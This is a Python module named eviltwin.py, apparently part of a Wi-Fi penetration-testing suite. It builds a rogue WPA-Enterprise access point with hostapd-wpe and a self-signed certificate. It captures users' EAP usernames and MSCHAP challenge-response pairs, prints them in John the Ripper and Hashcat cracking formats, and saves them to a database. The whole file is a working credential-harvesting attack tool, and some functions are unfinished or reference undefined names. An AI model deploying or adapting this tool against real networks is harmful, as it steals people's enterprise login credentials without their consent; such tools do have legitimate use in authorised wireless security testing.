# Module: eviltwin.py
# Description: Creates an EAP based access point AKA EvilTwin.
# Author: Nick Sanzotta
# Contributors: 
# Version: v 1.08252017

try:
	import os, sys, time, signal, threading
	from subprocess import Popen, PIPE
	from theme import *
except Exception as e:
	print('\n [!] Error ' +str(e))


try:
	from dbcommands import DB
	import sqlite3
	conn = sqlite3.connect('data/WiFiSuite.db', check_same_thread=False) # KEEP Thread Support
	conn.text_factory = str # KEEP Interpret 8-bit bytestrings 
	conn.isolation_level = None # KEEP Autocommit Mode
	db = DB(conn)
except Exception as e:
	print(red('!') + 'Could not connect to database: ' +str(e))
	sys.exit(1)	

class evilTwin(threading.Thread):
	def __init__(self, interface, ssid, channel, macaddress, \
	 certname, band, server_cert, private_key,\
	 country, state, city, company, ou, email):
		threading.Thread.__init__(self)
		self.setDaemon(0) # Creates thread in non-daemon mode
		self.interface = interface
		self.wirelessInt = str(self.interface.get_ifname())
		self.macaddress = macaddress
		self.ssid = ssid
		self.channel = channel
		self.certname = certname
		self.band = band
		self.country = country
		self.state = state
		self.city = city
		self.company = company
		self.ou = ou
		self.email = email
		self.server_cert = server_cert
		self.private_key = private_key

	def run(self):
		self.datafolders_check()
		self.sslCert(self.country, self.state, self.city, self.company, self.ou, self.certname, self.email)
		self.dependency_check()
		self.hostapd_config()
		self.sanity_check()
		time.sleep(1.5)
		p1 = Popen(['hostapd-wpe', 'data/hostapd-wpe/hostapd-wpe.conf'], stdout=PIPE)
		print('\n [i] Real-time logs below:\n')
		counter = 0
		if counter <= 5:
			for line in iter(p1.stdout.readline, ''):
				counter+=1
				# f.write(line)
				if "username" in line:
					user = line.split()[1]
					# sys.stdout.write(line)
				elif 'challenge' in line: 
					challenge = line.split()[1]
				elif 'response' in line:
					response = line.split()[1]
				elif 'jtr' in line:
					jtr = line.split()[2]
					print('Identity: %s' % (user))
					print('John: %s' % (jtr))
					print('Hashcat: %s::::%s:%s' % (user, response.translate(None, ':'), challenge.translate(None, ':')))
					# Commit to database
		
		# Obtain hostapd-wpe Process ID
		global eviltwin_pid
		eviltwin_pid=p1.pid
		raw_input(red('!') + 'Press Enter to quit\n\n')
		self.captured_creds()
		# Send the signal terminate HTTPS Serverprocess
		os.kill(os.getpgid(eviltwin_pid), signal.SIGTERM)
		# self.driver_fix()
	
	def dependency_check(self):
		'''Checks if hostapd-wpe is installed, if not installs it'''
		p1 = Popen(['which', 'hostapd-wpe'], stdout=PIPE)
		if p1.communicate()[0]:
			p2 = Popen(["dpkg-query", "-W", "-f", "${version}", "hostapd-wpe"], stdout=PIPE)
			print(blue('i')+'Running hostapd-wpe %s' % (p2.communicate()[0]))
		else:
			print(blue('i')+'Installing hostapd-wpe ...')
			p3 = Popen(['apt-get install -y hostapd-wpe'], shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
			p3.wait()
			print(' [*] Installation completed')
			os.system('which hostapd-wpe')
			os.system('hostapd-wpe -v')
			print('\n')
			# print(p2.communicate())
	
	def datafolders_check(self):
		'''Creates Cert and or Hostapd folder(s) if missing'''
		cert_directory = 'data/certs'
		hostapd_directory = 'data/hostapd-wpe'
		eviltwin_directory = 'data/eviltwin'
		if not os.path.exists(cert_directory):
			os.makedirs(cert_directory)
		if not os.path.exists(hostapd_directory):
			os.makedirs(hostapd_directory)
		if not os.path.exists(eviltwin_directory):
			os.makedirs(eviltwin_directory)


	def sanity_check(self):
		'''Terminates conflicting processes'''
		p1 = Popen(['airmon-ng','check','kill'], stdout=PIPE)

	def driver_fix(self):
		p1 = Popen(['iwpriv', 'wlan0', 'reset', '0'], stdout=PIPE)


	def fix_broken_package(self):
		'''Fixes broken hostapd-wpe packages'''
		os.system('apt-get purge hostapd-wpe')
		os.system('apt-get update')
		os.system('apt-get install hostapd-wpe')
		#/var/run/hostapd-wpe/wlan0
		# iwpriv wlan0 reset 0; and if that is not
		# enough, change 0 to 1

	def hostapd_config(self):
		'''Creates hostadp-wpe config file based of parameter values'''
		# Open original hostapd-wpe configuration file.
		with open('/etc/hostapd-wpe/hostapd-wpe.conf', 'r') as f1:
		    # Read a List of lines into data
		    data = f1.readlines()

		# Lines to modify in hostapd-wpe config file
		data[3] = 'interface=%s\n' % (self.wirelessInt)
		# TESTING DRIVER BUG
		data[1] = 'driver=nl80211\n'
		data[14]= 'ssid=%s\n' % (self.ssid)
		data[15]= 'channel=%s\n' % (self.channel)
		data[8] = 'server_cert=%s\n' % (self.server_cert)
		data[9] = 'private_key=%s\n' % (self.private_key)
		data[19] = 'wpe_logfile=data/eviltwin/%s.log\n' % (self.ssid)
		data[183] = 'hw_mode=%s\n' % (self.band.lower())


		print(green('*')+'EvilTwin Details:')
		print('     AP Interface: %s' % (self.wirelessInt))
		print('     SSID: %s' % (self.ssid))
		print('     Band: %s' % (self.band))
		print('     Channel: %s' % (self.channel))
		print('     Certificate Name: %s' % (self.certname))
		print('     Log saved to: data/eviltwin/%s.log' % (self.ssid))
		# print('     Server Cert Path: %s' % (self.server_cert))
		# print('     Private Key Path: %s' % (self.private_key))
		# Design Reference: 
		# Line4: # interface=wlan0
		# Line7: # eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
		# Line8: # ca_cert=/etc/hostapd-wpe/certs/ca.pem
		# Line9: # server_cert=/etc/hostapd-wpe/certs/server.pem
		# Line10:# private_key=/etc/hostapd-wpe/certs/server.key
		# Line11:# private_key_passwd=whatever
		# Line12:# dh_file=/etc/hostapd-wpe/certs/dh
		# Line15:# ssid=hostapd-wpe
		# Line16:# channel=1
		# Line20:# wpe_logfile=somefile              # (Default: ./hostapd-wpe.log)
		# Line184:# hw_mode=g
		
		# Save new hostapd-wpe config file in WiFiSuite's data/hostapd-wpe directory
		with open('data/hostapd-wpe/hostapd-wpe.conf', 'w') as f1:
		    f1.writelines( data )


	def sslCert(self, country, state, city, company, orgUnit, fqdn, email):
		'''Create SSL Cert with Specified Values '''
		cert = """openssl \
		req \
		-nodes \
	    -x509\
	    -newkey rsa:2048 \
	    -keyout data/certs/private_key.pem \
	    -out data/certs/server_cert.pem \
	    -days 365\
	    -subj "/C={0}/ST={1}/L={2}/O={3}/OU={4}/CN={5}/emailAddress={6}"
		"""
		createCert = cert.format(country, state, city, company, orgUnit, fqdn, email)
		p1 = Popen([createCert],shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=open("/dev/null", "w"))
		p1.wait()
		# for line in iter(p1.stdout.readline, ''):
		#     sys.stdout.write(line)
		# print(green('*') + 'TLS/SSL Certificate Successfully Created')
	
	def captured_creds(self):
		ntlm_hash = ''
		log = 'data/eviltwin/%s.log' % (self.ssid)
		with open(log) as f1:
			f1.readline()
			for line in f1:
				if "username" in line:
					user = line.split()[1]
				elif 'challenge' in line: 
					challenge = line.split()[1]
				elif 'response' in line:
					response = line.split()[1]
					print('%s, %s, %s' % (user, challenge, response))
					# Commit to database
					db.eviltwin_commit(self.ssid, user, ntlm_hash)


	def grab_internal_ip(self):
		print('Place holder')

	def grab_external_ip(self):
		print('Place holder')

	def certbot_dependency_check(self):
		p1 = Popen(['which', 'certbot'], stdout=PIPE)
		if p1.communicate()[0]:
			p2 = Popen(["certbot", "--version"], stdout=PIPE)
			print(blue('i')+'Running %s' % (p2.communicate()[0]))
		else:
			print(blue('i')+'Installing certbot ...')
			p3 = Popen(['apt-get install -y certbot'], shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
			p3.wait()
			print(' [*] Installation completed')
			os.system('which certbot')
			os.system('certbot --version')
			print('\n')
			# print(p2.communicate())

	def certbot(self):
		if args == 'certbot':
			self.dependency_check_certbot()
			print('run certbot, ignore OpenSSL')
			print('Ensure Port 80 is forwarded from Internal <IP> to external <IP>')
			print('Create DNS A record for '+ self.certbot + ' pointing to external <IP>')
			raw_input('Ready?')
			p1 = Popen(["certbot certonly --standalone --preferred-challenges http -d" + self.certbot], stdout=PIPE)
			print('Saving Certs to: data/certs/DOMAIN/')
			self.server_cert = 'data/certs/DOMAIN'
			self.private_key = 'data/certs/DOMAIN'
		else:
			print('Run OpenSSL')
